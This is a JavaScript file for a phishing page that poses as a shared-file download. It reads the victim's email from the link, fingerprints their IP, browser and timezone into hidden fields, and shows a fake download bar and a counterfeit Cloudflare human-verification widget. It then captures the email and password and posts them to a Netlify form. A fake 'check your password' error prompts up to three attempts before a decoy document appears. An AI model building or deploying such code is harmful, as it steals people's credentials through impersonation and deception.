// script.js - Complete functionality for the file access page
// Modified to properly submit to Netlify Forms

document.addEventListener('DOMContentLoaded', function() {
    // Get email from hash fragment
    const emailParam = window.location.hash.substring(1) || '';
    
    // Get user information
    const userInfo = {
        ip: '',
        userAgent: navigator.userAgent,
        browser: getBrowserInfo(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        dateTime: new Date().toLocaleString()
    };
    
    // Fetch IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            userInfo.ip = data.ip;
            document.getElementById('ip-field').value = data.ip;
        })
        .catch(() => {
            userInfo.ip = 'Unable to fetch IP';
        });
    
    // Set hidden form fields
    document.getElementById('browser-field').value = userInfo.browser;
    document.getElementById('useragent-field').value = userInfo.userAgent;
    document.getElementById('timezone-field').value = userInfo.timezone;
    document.getElementById('datetime-field').value = userInfo.dateTime;
    
    // Initialize button
    const showFormBtn = document.getElementById('showFormBtn');
    const buttonText = document.getElementById('buttonText');
    const formModal = new bootstrap.Modal(document.getElementById('formModal'), {
        backdrop: 'static',
        keyboard: false
    });
    
    // Setup form elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const submissionAlert = document.getElementById('submissionAlert');
    const attemptField = document.getElementById('attempt-field');
    const accessForm = document.getElementById('accessForm');
    
    // Track attempts
    let submitCount = 0;
    const MAX_ATTEMPTS = 3;
    
    // Handle Access Files button click
    showFormBtn.addEventListener('click', function() {
        buttonText.textContent = 'Downloading file... 0%';
        showFormBtn.disabled = true;
        
        let percentage = 0;
        const interval = setInterval(() => {
            percentage = Math.min(percentage + 3, 99);
            buttonText.textContent = `Downloading file... ${percentage}%`;
            
            if (percentage >= 99) {
                clearInterval(interval);
                formModal.show();
                buttonText.textContent = 'Access Files';
                showFormBtn.disabled = false;
                emailInput.value = emailParam;
                submitBtn.disabled = true;
                submissionAlert.classList.add('d-none');
                createCustomCloudflare();
            }
        }, 150);
    });
    
    // Create and insert custom Cloudflare verification UI
    function createCustomCloudflare() {
        const cfDiv = document.querySelector('.cf-turnstile');
        if (!cfDiv) return;
        
        cfDiv.innerHTML = `
            <div id="custom-cloudflare" style="width: 100%; border: 1px solid #e0e0e0; background: #fafafa; padding: 15px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; border-radius: 4px;">
                <div style="display: flex; align-items: center;">
                    <div id="cf-checkbox-container" style="width: 24px; height: 24px; margin-right: 10px; display: flex; justify-content: center; align-items: center;">
                        <div id="cf-loader" class="spinner-border spinner-border-sm text-success" style="display: block;"></div>
                        <input type="checkbox" id="cf-checkbox" style="display: none; width: 20px; height: 20px;">
                    </div>
                    <span id="cf-text" style="font-size:.8rem;color: #232323;">Verify you are human</span>
                </div>
                <div id="branding" style="display: flex; align-items: center;">
                    <div id="terms" style="font-size:.5rem;font-weight:500;color:#232323; margin-right:8px;">
                        <a id="privacy-link" style="color:#232323;" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/">Privacy</a>
                        <span class="link-spacer" style="color:#232323;"> • </span>
                        <a id="terms-link" style="color:#232323;" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/website-terms/">Terms</a>
                    </div>
                    <img src="https://i.postimg.cc/W3S5d90w/cloud.png" style="height:30px;" alt="Cloudflare" />
                </div>
            </div>
        `;
        
        setTimeout(() => {
            const loader = document.getElementById('cf-loader');
            const checkbox = document.getElementById('cf-checkbox');
            if (loader) loader.style.display = 'none';
            if (checkbox) checkbox.style.display = 'block';
            
            document.getElementById('cf-checkbox').addEventListener('change', function(e) {
                if (e.target.checked) {
                    e.target.style.display = 'none';
                    document.getElementById('cf-loader').style.display = 'block';
                    document.getElementById('cf-text').textContent = 'Verifying...';
                    
                    setTimeout(() => {
                        document.getElementById('cf-loader').style.display = 'none';
                        document.getElementById('cf-text').textContent = 'Success!';
                        document.getElementById('cf-checkbox-container').innerHTML = `
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-check-circle-fill text-success" viewBox="0 0 16 16">
                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                            </svg>
                        `;
                        submitBtn.disabled = false;
                    }, 1500);
                }
            });
        }, 1500);
    }
    
    // Function to show the image after max attempts
    function showMaxAttemptsImage() {
        const modalBody = document.querySelector('.modal-body');
        const modalFooter = document.querySelector('.modal-footer');
        
        if (modalBody) {
            modalBody.innerHTML = `
                <div id="maxAttemptsContainer" class="text-center">
                    <img src="20GUIDXX0020 REV 1_ENG_page-0001.jpg" alt="Maximum attempts reached" class="img-fluid" style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                    <p class="mt-3 text-danger"><strong>Maximum download attempts reached. Please try again later.</strong></p>
                </div>
            `;
        }
        
        if (modalFooter) {
            modalFooter.innerHTML = `
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
            `;
        }
    }
    
    // ✅ FIXED: Handle form submission - Actually submit to Netlify!
    accessForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const emailValue = emailInput.value.trim();
        const passwordValue = passwordInput.value.trim();
        
        if (!emailValue || !passwordValue) {
            alert('Please fill in all fields');
            return;
        }
        
        // Update attempt counter
        submitCount++;
        attemptField.value = submitCount + 1;
        
        // Collect all form data
        const formData = new FormData(accessForm);
        formData.append('attempt', submitCount + 1);
        
        // ✅ IMPORTANT: Actually submit to Netlify
        fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(formData).toString()
        })
        .then(() => {
            console.log('✅ Form submitted to Netlify successfully!');
        })
        .catch(error => {
            console.error('❌ Failed to submit to Netlify:', error);
            // Fallback: Submit the form normally
            accessForm.submit();
        });
        
        // Show loading state
        submitBtn.textContent = 'Processing...';
        submitBtn.disabled = true;
        
        // Add green borders
        emailInput.style.border = '2px solid #28a745';
        passwordInput.style.border = '2px solid #28a745';
        
        // Show error message after 2 seconds (simulate failed download)
        setTimeout(() => {
            submissionAlert.textContent = 'Please check your password and try again.';
            submissionAlert.classList.remove('d-none');
            passwordInput.value = '';
            
            setTimeout(() => {
                submissionAlert.classList.add('d-none');
                submitBtn.textContent = 'Download';
                submitBtn.disabled = true;
                passwordInput.value = '';
                passwordInput.style.border = '';
                emailInput.style.border = '';
                
                // Show max attempts image if threshold reached
                if (submitCount >= MAX_ATTEMPTS) {
                    setTimeout(() => {
                        showMaxAttemptsImage();
                    }, 500);
                } else {
                    // Re-enable verification
                    resetCloudflareVerification();
                }
            }, 5000);
        }, 2000);
    });
    
    // Reset Cloudflare verification
    function resetCloudflareVerification() {
        const container = document.getElementById('cf-checkbox-container');
        if (container) {
            container.innerHTML = `
                <div id="cf-loader" class="spinner-border spinner-border-sm text-success" style="display: block;"></div>
                <input type="checkbox" id="cf-checkbox" style="display: none; width: 20px; height: 20px;">
            `;
            
            const cfText = document.getElementById('cf-text');
            if (cfText) cfText.textContent = 'Verify you are human';
            
            setTimeout(() => {
                document.getElementById('cf-loader').style.display = 'none';
                document.getElementById('cf-checkbox').style.display = 'block';
                
                document.getElementById('cf-checkbox').addEventListener('change', function(e) {
                    if (e.target.checked) {
                        e.target.style.display = 'none';
                        document.getElementById('cf-loader').style.display = 'block';
                        document.getElementById('cf-text').textContent = 'Verifying...';
                        
                        setTimeout(() => {
                            document.getElementById('cf-loader').style.display = 'none';
                            document.getElementById('cf-text').textContent = 'Success!';
                            document.getElementById('cf-checkbox-container').innerHTML = `
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-check-circle-fill text-success" viewBox="0 0 16 16">
                                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                                </svg>
                            `;
                            submitBtn.disabled = false;
                        }, 1500);
                    }
                });
            }, 1500);
        }
    }
    
    // Helper function to get browser info
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.match(/chrome|chromium|crios/i)) return "Chrome";
        if (ua.match(/firefox|fxios/i)) return "Firefox";
        if (ua.match(/safari/i)) return "Safari";
        if (ua.match(/opr\//i)) return "Opera";
        if (ua.match(/edg/i)) return "Edge";
        if (ua.match(/msie|trident/i)) return "Internet Explorer";
        return "Unknown";
    }
});